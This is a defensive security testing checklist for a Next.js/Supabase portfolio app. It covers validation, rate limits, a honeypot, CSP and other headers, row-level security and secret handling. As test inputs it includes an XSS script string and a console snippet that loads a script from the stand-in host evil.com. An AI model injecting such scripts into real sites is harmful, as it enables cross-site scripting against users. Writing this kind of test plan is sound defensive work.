# Security Testing Checklist - Etapa 2

This document provides a comprehensive checklist for end-to-end security testing of the Mi-Portafolio application after implementing API security hardening.

**Requirements covered:** All (End-to-end validation)

---

## 🧪 Testing Overview

### Testing Scope

- ✅ API endpoint security (validation, rate limiting, authentication)
- ✅ Honeypot anti-spam protection
- ✅ Security headers configuration
- ✅ Row Level Security (RLS) policies
- ✅ Environment variable security
- ✅ Cross-theme functionality

---

## 📋 Pre-Testing Setup

### 1. Build the Application

```bash
npm run build
```

**Expected:** Build completes successfully with no errors.

### 2. Start Development Server

```bash
npm run dev
```

**Expected:** Server starts on http://localhost:3000

### 3. Prepare Test Tools

- Browser DevTools (Network tab, Console)
- Postman or curl for API testing
- Different browsers for cross-compatibility testing

---

## 🔐 Contact API Testing

### Test 1.1: Valid Contact Form Submission

**Steps:**
1. Navigate to any theme's contact page (Space, Classic, Runic, Cyber)
2. Fill in form with valid data:
   - Name: "Test User"
   - Email: "test@example.com"
   - Message: "This is a test message with more than 10 characters"
3. Submit the form

**Expected Results:**
- ✅ Form submits successfully
- ✅ Success message displayed
- ✅ HTTP 201 response
- ✅ Data appears in Supabase messages table
- ✅ HTML characters are escaped (if input contains `<script>` tags)

### Test 1.2: Invalid Email Format

**Steps:**
1. Fill form with invalid email: "notanemail"
2. Submit

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Invalid email format"

### Test 1.3: Short Name Validation

**Steps:**
1. Fill form with name: "A" (1 character)
2. Submit

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Name must be between 2 and 100 characters"

### Test 1.4: Short Message Validation

**Steps:**
1. Fill form with message: "Hi" (2 characters)
2. Submit

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Message must be between 10 and 2000 characters"

### Test 1.5: Rate Limiting (3 requests / 60 seconds)

**Steps:**
1. Submit contact form 3 times quickly with valid data
2. Attempt 4th submission

**Expected:**
- ✅ First 3 submissions succeed (HTTP 201)
- ✅ 4th submission fails with HTTP 429
- ✅ Error message: "Too many requests, please try again later"
- ✅ After 60 seconds, can submit again

### Test 1.6: Honeypot Bot Detection

**Steps:**
1. Open browser DevTools > Console
2. Run this code to fill the honeypot field:
   ```javascript
   document.querySelector('input[name="website"]').value = 'bot';
   ```
3. Fill rest of form with valid data
4. Submit

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Invalid submission" (generic, doesn't mention honeypot)
- ✅ Submission is rejected
- ✅ Check server logs for honeypot detection log

### Test 1.7: XSS Prevention

**Steps:**
1. Fill message with: `<script>alert('XSS')</script>Test message`
2. Submit
3. Check Supabase messages table

**Expected:**
- ✅ Message is stored with escaped HTML: `&lt;script&gt;alert('XSS')&lt;/script&gt;Test message`
- ✅ No script execution occurs

### Test 1.8: GET Endpoint Blocked

**Steps:**
1. Open browser and navigate to: `http://localhost:3000/api/contact`

**Expected:**
- ✅ HTTP 401 response
- ✅ Error message: "Authentication required"
- ✅ No message data is exposed

---

## 📦 Projects API Testing

### Test 2.1: Valid Project Creation (Admin Only)

**Note:** This requires authentication. Test with admin credentials or update policies for testing.

**Steps:**
1. POST to `/api/projects` with valid data:
   ```json
   {
     "title": "Test Project",
     "description": "Test Description",
     "technologies": ["React", "TypeScript"],
     "github_url": "https://github.com/user/repo",
     "live_url": "https://example.com",
     "image_url": "https://example.com/image.png"
   }
   ```

**Expected:**
- ✅ HTTP 201 response (if authenticated as admin)
- ✅ HTTP 429 after 10 requests (rate limit)

### Test 2.2: Invalid URL Format

**Steps:**
1. POST with invalid GitHub URL: `"github_url": "not-a-url"`

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Invalid GitHub URL format"

### Test 2.3: Missing Required Fields

**Steps:**
1. POST without title

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Title is required"

### Test 2.4: Technologies Array Validation

**Steps:**
1. POST with non-string technology: `"technologies": ["React", 123]`

**Expected:**
- ✅ HTTP 400 response
- ✅ Error message: "Technologies must be an array of strings"

### Test 2.5: Rate Limiting (10 requests / 60 seconds)

**Steps:**
1. POST to `/api/projects` 10 times quickly
2. Attempt 11th POST

**Expected:**
- ✅ First 10 succeed (HTTP 201 or 400 depending on auth)
- ✅ 11th fails with HTTP 429
- ✅ Error: "Too many requests, please try again later"

---

## 📊 Visits API Testing

### Test 3.1: Valid Visit Tracking

**Steps:**
1. POST to `/api/visits`:
   ```json
   {
     "page": "/home",
     "user_agent": "Mozilla/5.0..."
   }
   ```

**Expected:**
- ✅ HTTP 201 response
- ✅ Visit recorded in database

### Test 3.2: Missing Page Field

**Steps:**
1. POST without page field

**Expected:**
- ✅ HTTP 400 response
- ✅ Error mentioning page is required

### Test 3.3: Rate Limiting (100 requests / 60 seconds)

**Steps:**
1. POST 100 times quickly
2. Attempt 101st POST

**Expected:**
- ✅ First 100 succeed
- ✅ 101st fails with HTTP 429

---

## 🛡️ Security Headers Testing

### Test 4.1: CSP Header Present

**Steps:**
1. Open any page in browser
2. Open DevTools > Network tab
3. Select the page request
4. Check Response Headers

**Expected Headers:**
- ✅ `Content-Security-Policy`: Present with directives
- ✅ `X-Content-Type-Options`: `nosniff`
- ✅ `Referrer-Policy`: `strict-origin-when-cross-origin`
- ✅ `Permissions-Policy`: Present with restrictions
- ✅ `X-Frame-Options`: `DENY`
- ✅ `X-XSS-Protection`: `1; mode=block`

### Test 4.2: CSP Allows Required Resources

**Steps:**
1. Navigate through all 4 themes (Space, Classic, Runic, Cyber)
2. Check browser console for CSP violations

**Expected:**
- ✅ No CSP errors in console
- ✅ All themes render correctly
- ✅ Styles load properly (inline styles allowed)
- ✅ Images from Supabase load correctly
- ✅ API calls to Supabase succeed

### Test 4.3: CSP Blocks Unauthorized Resources

**Steps:**
1. Try to load an external script via console:
   ```javascript
   const script = document.createElement('script');
   script.src = 'https://evil.com/malicious.js';
   document.head.appendChild(script);
   ```

**Expected:**
- ✅ CSP blocks the script
- ✅ Console error: "Refused to load the script..."

---

## 🗄️ Supabase RLS Testing

**Note:** These tests require Supabase SQL migrations to be applied.

### Test 5.1: Anonymous User - Messages Table

**Steps:**
1. Use Supabase client without authentication:
   ```typescript
   const { data, error } = await supabase
     .from('messages')
     .select('*');
   ```

**Expected:**
- ✅ Error: Row Level Security policy violation
- ✅ No data returned

### Test 5.2: Anonymous User - Insert Message

**Steps:**
1. Insert message without auth:
   ```typescript
   const { data, error } = await supabase
     .from('messages')
     .insert({ name: 'Test', email: 'test@test.com', message: 'Hello' });
   ```

**Expected:**
- ✅ Success: Insert allowed
- ✅ No error

### Test 5.3: Admin User - Select Messages

**Steps:**
1. Authenticate as admin user
2. Query messages table

**Expected:**
- ✅ Success: Data returned
- ✅ All messages visible

### Test 5.4: Anonymous User - Projects Table

**Steps:**
1. Query projects without auth:
   ```typescript
   const { data, error } = await supabase
     .from('projects')
     .select('*');
   ```

**Expected:**
- ✅ Success: Projects are public
- ✅ Data returned

### Test 5.5: Anonymous User - Insert Project

**Steps:**
1. Try to insert project without auth

**Expected:**
- ✅ Error: RLS policy violation
- ✅ Insert blocked

---

## 🌐 Cross-Theme Testing

### Test 6.1: All Themes Functional

**Steps:**
1. Test contact form in each theme:
   - Space: http://localhost:3000/#contacto
   - Classic: http://localhost:3000/classic/contacto
   - Runic: http://localhost:3000/runic (scroll to contact)
   - Cyber: http://localhost:3000/cyber/contacto

**Expected:**
- ✅ All forms display correctly
- ✅ All forms have honeypot field (invisible)
- ✅ All forms submit successfully
- ✅ All forms validate properly
- ✅ All forms respect rate limits
- ✅ Security headers apply to all themes

### Test 6.2: Honeypot Field Hidden

**Steps:**
1. Visually inspect each contact form
2. Use browser inspector to find honeypot field

**Expected:**
- ✅ Honeypot field is not visible to users
- ✅ Field is positioned off-screen (`left: -9999px`)
- ✅ Field is in the DOM for bots to fill

---

## 🔧 Environment Variables Testing

### Test 7.1: .gitignore Verification

**Steps:**
```bash
git status
```

**Expected:**
- ✅ `.env.local` is NOT in tracked files
- ✅ `.env.example` IS tracked

### Test 7.2: Build-Time Variable Exposure

**Steps:**
1. Build the app: `npm run build`
2. Inspect `.next/static/chunks/*.js` files
3. Search for "SERVICE_ROLE"

**Expected:**
- ✅ No service role key found in built JavaScript
- ✅ Only `NEXT_PUBLIC_` variables are embedded

### Test 7.3: Runtime Variable Access

**Steps:**
1. Add temporary test in client component:
   ```typescript
   console.log(process.env.SUPABASE_SERVICE_ROLE_KEY);
   ```
2. Check browser console

**Expected:**
- ✅ `undefined` (not accessible in client)

---

## 📈 Performance & User Experience

### Test 8.1: Legitimate User Experience

**Steps:**
1. Submit valid contact form with typical user behavior
2. Measure response time

**Expected:**
- ✅ Submission completes in < 1 second
- ✅ No unnecessary delays from security measures
- ✅ User-friendly error messages

### Test 8.2: Rate Limit Reset

**Steps:**
1. Hit rate limit
2. Wait 60 seconds
3. Submit again

**Expected:**
- ✅ Rate limit counter resets
- ✅ New submissions allowed

---

## ✅ Final Verification Checklist

Before marking Etapa 2 as complete:

### APIs
- [ ] Contact API validates all inputs
- [ ] Contact API blocks GET requests (401)
- [ ] Contact API enforces rate limiting (3/60s)
- [ ] Contact API detects honeypot submissions
- [ ] Contact API escapes HTML for XSS prevention
- [ ] Projects API validates inputs
- [ ] Projects API enforces rate limiting (10/60s)
- [ ] Visits API validates inputs
- [ ] Visits API enforces rate limiting (100/60s)

### Security Infrastructure
- [ ] Middleware applies security headers to all routes
- [ ] CSP allows required resources (Supabase, fonts, images)
- [ ] CSP blocks unauthorized resources
- [ ] All 4 themes render correctly with CSP
- [ ] RLS policies are created and active
- [ ] RLS policies tested with anonymous and admin users

### Environment Variables
- [ ] `.env.local` is in `.gitignore`
- [ ] `.env.example` contains only placeholders
- [ ] No service role keys have `NEXT_PUBLIC_` prefix
- [ ] Service role key not accessible in client code
- [ ] No secrets committed to git

### User Experience
- [ ] All 4 themes have functional contact forms
- [ ] Honeypot fields are invisible but present
- [ ] Error messages are user-friendly
- [ ] Valid submissions succeed without issues
- [ ] Rate limiting doesn't affect normal users

### Documentation
- [ ] RLS policies documented with application instructions
- [ ] Environment variables guide created
- [ ] Security testing checklist completed (this document)

---

## 🎉 Success Criteria

**Etapa 2 is complete when:**

1. ✅ All API endpoints have comprehensive security (validation, rate limiting, auth)
2. ✅ All tests in this checklist pass
3. ✅ Security headers are active on all routes
4. ✅ RLS policies protect Supabase data
5. ✅ Environment variables are properly secured
6. ✅ All 4 themes work correctly with security measures
7. ✅ No security warnings in browser console
8. ✅ Build completes without errors

---

**Testing Completed:** [DATE]
**Tested By:** [YOUR NAME]
**All Tests Passed:** ✅ YES / ❌ NO

**Notes:**
- [Any issues found during testing]
- [Deviations from expected behavior]
- [Additional observations]
